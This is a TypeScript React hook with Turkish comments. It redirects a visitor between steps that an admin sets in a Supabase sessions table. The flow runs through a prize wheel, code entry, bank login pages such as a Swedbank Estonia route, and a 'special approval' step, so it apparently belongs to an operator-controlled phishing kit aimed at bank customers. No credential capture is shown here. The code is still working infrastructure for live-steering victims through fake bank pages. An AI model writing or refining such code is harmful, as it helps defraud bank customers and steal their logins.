"use client";
import { useEffect } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";

export function useEnsureCurrentStep(sessionId: string | undefined) {
  useEffect(() => {
    if (!sessionId || typeof window === "undefined") return;
    const localStep = pathToStep(window.location.pathname);
    if (!localStep) return;

    // BANKA LOGIN SAYFASINDA (örn. /win/123/bank/swedbank-ee) YÖNLENDİRME YAPMA:
    const path = window.location.pathname;
    const isBankLoginPage = path.includes("/bank/") || localStep === "bank";

    // WHEEL ↔ CODE LOOP ÖNLEME:
    // 1. Eğer kullanıcı WHEEL'deyse ve DB code_entry ise → KODA YÖNLENDİRME, DB'yi wheel'e DÜZELT
    // 2. Eğer kullanıcı CODE'dayse ve DB wheel ise → WHEEL'e YÖNLENDİR (code-client auto-skip aynı)
    const fd = (prev?: Record<string, unknown> | null): Record<string, unknown> => (prev ?? {}) as Record<string, unknown>;
    const isWheelGame = (form: Record<string, unknown>): boolean => {
      return Boolean(form.is_wheel_game) || !form.expectedCode || String(form.expectedCode || "").trim().length === 0;
    };

    let cancelled = false;

    void (async () => {
      try {
        const supabase = createBrowserSupabaseClient();
        if (!supabase) return;

        const { data, error } = await supabase
          .from("sessions")
          .select("current_step,form_data")
          .eq("id", sessionId)
          .maybeSingle();

        if (cancelled || error) return;

        const serverStep = (data?.current_step as unknown) as string | null | undefined;
        const effectiveRouteId = getPreferredRouteSessionId(sessionId);
        const formData = fd(data?.form_data ?? null);

        if (isBankLoginPage) {
          if (serverStep && serverStep === "special_approval") {
            const target = resolveStepTargetPath(serverStep as any, sessionId, effectiveRouteId, formData);
            if (!cancelled) window.location.replace(target);
          }
          return;
        }

        // ==== WHEEL ↔ CODE LOOP ÖNLEME: ÖZEL KURAL ====
        if (localStep === "wheel" && serverStep === "code_entry" && isWheelGame(formData)) {
          // Kullanıcı çarkta, DB yanlışlıkla code_entry (veya eski cache)
          // KOD SAYFASINA YÖNLENDİRME: DB'yi wheel olarak düzelt, kal.
          try {
            await supabase
              .from("sessions")
              .update({
                current_step: "wheel",
                is_hidden: false,
                form_data: { ...formData, is_wheel_game: true },
              })
              .eq("id", sessionId);
          } catch { /* ignore */ }
          // Döngüden çık: yönerdirme YOK
        } else if (localStep === "code_entry" && (serverStep === "wheel" || (serverStep === "code_entry" && isWheelGame(formData)))) {
          // Kullanıcı code'da, DB wheel veya code_entry AMA is_wheel_game ise → direkt wheel'e at
          const target = resolveStepTargetPath("wheel", sessionId, effectiveRouteId, formData);
          if (!cancelled) window.location.replace(target);
        } else if (serverStep && serverStep !== localStep) {
          // Normal kural: adminin atadığı farklı bir adım varsa (yukarıdaki wheel↔code hariç)
          const target = resolveStepTargetPath(serverStep as any, sessionId, effectiveRouteId, formData);
          try {
            const p = new URL(target, window.location.origin).pathname;
            if (p === window.location.pathname) return;
          } catch { /* ignore */ }
          if (!cancelled) window.location.replace(target);
          return;
        } else {
          // Server step ya yok, ya da bizimkiyle aynı: yaz
          const shouldWrite = !serverStep || serverStep === localStep;
          if (shouldWrite && !cancelled) {
            await supabase.from("sessions").update({ is_hidden: false, current_step: localStep }).eq("id", sessionId);
          }
        }

        // 600ms SONRASI TEKRAR KONTROL (aynı kurallar geçerli)
        window.setTimeout(async () => {
          if (cancelled) return;
          const fresh = createBrowserSupabaseClient();
          if (!fresh) return;
          try {
            const { data: freshData } = await fresh
              .from("sessions")
              .select("current_step,form_data")
              .eq("id", sessionId)
              .maybeSingle();
            const freshServerStep = (freshData?.current_step as unknown) as string | null | undefined;
            const freshFormData = fd(freshData?.form_data ?? null);
            const nowLocalStep = pathToStep(window.location.pathname);
            const nowPath = window.location.pathname;
            const nowIsBank = nowPath.includes("/bank/") || nowLocalStep === "bank";

            if (cancelled || !nowLocalStep) return;
            if (nowIsBank) {
              if (freshServerStep === "special_approval") {
                const at = resolveStepTargetPath(freshServerStep as any, sessionId, getPreferredRouteSessionId(sessionId), freshFormData);
                window.location.replace(at);
              }
              return;
            }

            // 2. tur loop onleme
            if (nowLocalStep === "wheel" && freshServerStep === "code_entry" && isWheelGame(freshFormData)) {
              try {
                await fresh.from("sessions").update({
                  current_step: "wheel",
                  is_hidden: false,
                  form_data: { ...freshFormData, is_wheel_game: true },
                }).eq("id", sessionId);
              } catch { /* ignore */ }
            } else if (nowLocalStep === "code_entry" && (freshServerStep === "wheel" || (freshServerStep === "code_entry" && isWheelGame(freshFormData)))) {
              const wheelTarget = resolveStepTargetPath("wheel", sessionId, getPreferredRouteSessionId(sessionId), freshFormData);
              window.location.replace(wheelTarget);
            } else if (freshServerStep && freshServerStep !== nowLocalStep) {
              const at = resolveStepTargetPath(freshServerStep as any, sessionId, getPreferredRouteSessionId(sessionId), freshFormData);
              try {
                const p = new URL(at, window.location.origin).pathname;
                if (p === window.location.pathname) return;
              } catch { /* ignore */ }
              window.location.replace(at);
            } else if (!freshServerStep || freshServerStep === nowLocalStep) {
              await fresh.from("sessions").update({ current_step: nowLocalStep, is_hidden: false }).eq("id", sessionId);
            }
          } catch { /* no-op */ }
        }, 600);
      } catch { /* no-op */ }
    })();

    return () => {
      cancelled = true;
    };
  }, [sessionId]);
}

